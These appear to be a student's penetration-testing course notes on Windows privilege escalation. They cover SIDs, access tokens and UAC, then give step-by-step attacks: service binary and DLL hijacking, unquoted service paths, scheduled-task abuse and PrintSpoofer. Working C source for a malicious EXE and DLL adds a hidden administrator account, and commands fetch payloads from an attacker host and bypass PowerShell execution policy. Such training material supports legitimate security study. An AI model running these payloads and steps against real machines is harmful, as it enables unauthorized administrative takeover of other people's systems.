

## 16.1 Enumerating Windows


##### Windows Privileges and Access Control Mechanisms 
- SID
	- Unique value assigned to accounts
	- Local Security Authority (LSA) generates local account SIDs
	- DC generates domain SIDs
	- SID structure: S-R-X-Y
		- S = indicates string is a SID
		- R = revision (always 1)
		- X = identifier authority (commonly 5 )
		- Y = sub authority (consists of domain identifier and relative identifier (RID))
- Access Token
	- Authenticated users given access tokens describing the security context of the user
	- Security context = user SID, group SIDs, user + group perms
	- When user starts a process or thread, a token is assigned to those objects
		- primary token = permissions the process or threads have 
		- impersonation token = optional thread token with different security context than the process, interacts with objects on behalf of the process
- Mandatory Integrity Control 
	- Uses integrity levels to control access to securable objects
		- Any object with lower integrity level cannot write to object with higher level
	- Integrity levels are applied to any processes or objects created and are inherited by user that created them 
	- 4 Integrity levels (post Vista)
		- SYSTEM: SYSTEM
		- High: Elevated users
		- Medium: Standard users
		- Low: very restricted rights, usually temp data or sandboxed files
- User Account Control
	- Runs standard tasks with standard privileges even for elevated users
	- Elevated users given two tokens on authentication
		- Ex: Administrator is given a filtered admin token for standard privs and a regular admin token for privileged operation

##### Situational Awareness 
- Key survey items
	-  Username and hostname
	- Group memberships of the current user
	- Existing users and groups
	- Operating system, version and architecture
	- Network information
	- Installed applications
	- Running processes

##### Abusing Sensitive Information
- Use Runas commands in a GUI env to switch user contexts
- Use Psexec if target user has active session
- Use WinRM if user is in the Windows Remote Management group
	- evil-winrm better tool
- Schedule a task if user has *Log on as a batch job* enabled 

```
## System Info + Users ##
systeminfo
whoami
whoami /groups
net user
net localgroup 

## Networking ##
ipconfig /all
route print
netstat -ano

## Installed Software ##
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
dir "C:\Program Files\"
dir "C:\Program Files (x86)\"
dir "C:\ProgramData\"

## Processes ##  
tasklist
tasklist /m

## Switch User Context ##
runas /user:backupadmin cmd




POWERSHELL

## Enum ##
Get-LocalUser
Get-LocalGroup

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

## Powershell History ##
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\<HistorySavePath>\ConsoleHost_history.txt

## Services ##


```


##### Automated Enumeration 
- Tools
	- winPEAS
	- JAWS
	- Seatbelt
	- lolBAS
	- powerup.ps1


## 16.2 Leveraging Windows Services

##### Service Binary Hijacking
- If service binaries exist in unprotected place on disk, can replace the binary and restart the service 
- When using network logons such as WinRM or a bind shell, querying services will get permission denied, use RDP
- Use replaced binary to create a new user on the machine, then login, use Runas, or msfvenom
- Powerup.ps1 can automate the process but can throw fake permission errors, if so replace binary manually
	- location `/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1` 
	- default automated creds are john:Password123!
	- bypass execution policy with `powershell -ep bypass`

Steps:
1. Identify potentially vulnerable service paths
	- Need to be outside of system32
2. Verify write access to insecure permissions
3. Create malicious binary
	- Ex creates new user
	- Need to cross complile Unix to x64 Windows
	- Specify outfile as .exe
4. Transfer to target
5. Move original binary and replace with malicious 
6. Restart service or target
	- if stopping target, verify service auto-starts

1. Use Powerup.ps1
	- replace binary manually if needed


```
## Manual ##
1.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

2.
icacls "C:\xampp\mysql\bin\mysqld.exe"

3.
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

4. 
python3 -m http.server
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe

5.
move C:\xampp\mysql\bin\mysqld.exe .\mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

6.
net stop mysql

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
shutdown /r /t 0


## Powerup.ps1 ##
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

python3 -m http.server 80

iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name 'mysql'
```

```
Malicious Binary Example

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```


##### Service DLL Highjacking
- Microsoft DLL search order 
	1. The directory from which the application loaded.
	2. The system directory.
	3. The 16-bit system directory.
	4. The Windows directory. 
	5. The current directory.
	6. The directories that are listed in the PATH environment variable
- DLL Highjacking is replacing or adding a missing DLL that is malicious (example code below)
	- Procmon is a good resource for viewing any processes missing a DLL

Steps:
1. Identify potential service 
2. Start procmon, restart the service, and view service function calls
3. Verify PATH variable 
4. (KALI) Create malicious DLL and cross compile
5. Transfer to target
6. Restart service and verify malicious account creation

```
1.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

2.
Restart-Service BetaService

3.
$env:path

4.
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

5.
cd Documents
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
net user

6.
Restart-Service BetaService
net user
net localgroup administrators
```


```
Malicious DLL Example

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

```


##### Unquoted Service Paths
- Can abuse unquoted paths if a single parent dir of the service is writable
- Can use powerup.ps1 to identify potential candidates

Steps
1. Identify vulnerable services
2. Verify if you can stop/start service
	-  If not, verify service is autostart and reboot box
3. Iterate through parent dirs, checking permissions
4. upload malicious file to parent directory and start


```
1. 
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

2. 
Start-Service
Stop-Service

3.
icacls C:\
icacls C:\Program Files
icacls C:\Program Files\Enterprise Apps
icacls C:\Program Files\Enterprise Apps\Current Version\
icacls C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

4.
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```


## 16.2 Abusing other Windows Components 

##### Scheduled Tasks 
- Three pieces of info needed for potential escalation
	- As which user account (principal) does this task get executed?
	- What triggers are specified for the task?
	- What actions are executed when one or more of these triggers are met?
- Escalation relies on high privilege scheduled task with writable access 

Steps
1. Enum schtasks
2. List permissions of the executable the schtask is triggering 
3. Replace executable and wait for trigger


```
1.
schtasks /query /fo LIST /v

2.
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe

3.
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe

4.
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\BackendCacheCleanup.exe .\<executable_path>\
```


##### Exploits 
- Can exploit windows applications or the Windows Kernel itself
	- Has chance of BSODing the box
- Common windows piv esc exploits: Potato family (RottenPotato SweetPotato JuicyPotato)
- Example abuses SeImpersonatePrivilegeToken of a non-system user

Steps:
1. Connect to target and check privs
	- Verify SeImpersonatePrivilege is enabled
2. Download exploit to attack box and serve to target 
3. Execute


```
1.
nc 192.168.50.220 4444
whoami /priv

2.
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80

iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

3.
.\PrintSpoofer64.exe -i -c powershell.exe

```